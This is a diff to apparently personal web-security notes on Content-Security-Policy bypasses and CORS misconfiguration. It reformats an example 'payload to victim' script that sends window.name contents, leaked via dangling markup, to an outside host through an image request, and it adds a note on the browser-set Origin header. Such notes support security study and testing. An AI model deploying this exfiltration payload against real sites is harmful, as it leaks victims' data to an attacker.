@@ -333,8 +333,8 @@ CSP for directive with random hash that tells to execute only if the script cont
   - `Content-Security-Policy: script-src-elem 'none'; script-src-attr 'unsafe-inline'`
     `<script>alert("This will be blocked")</script>`
     `<a href="#" onclick="alert('This will be allowed')">test</a>`
-  payload to victim
-  ```
+  payload to victim 
+  `
   <script>
   if (window.name) {
     new Image().src = "https://example.com?"+ encodeURIComponent(window.name)
@@ -342,7 +342,7 @@ CSP for directive with random hash that tells to execute only if the script cont
     window.location = ""# with dangling markup in url parameters
   }
   </script>
-  ```
+  `
 
 
 
@@ -408,6 +408,7 @@ If a website is accessed over HTTPS but will happily accept CORS interactions fr
   * Indication where dynamic header is used, is to check if the origin is not given in request but AC headers are there in response and
   * ACAO is not sent in response by most of server when origin is not given in request so check with origin request header to get if CORS header are there in response
   * `ACAC` is false by default
+  * `Origin` this header cannot be set via javascript in browser but it's being set by browser dynamically
 - Developer gold
   - Specifiying this static header call `Vary:Origin` if dynamic header are used as if not given then
   - Even w3 sites do not have this header. haha
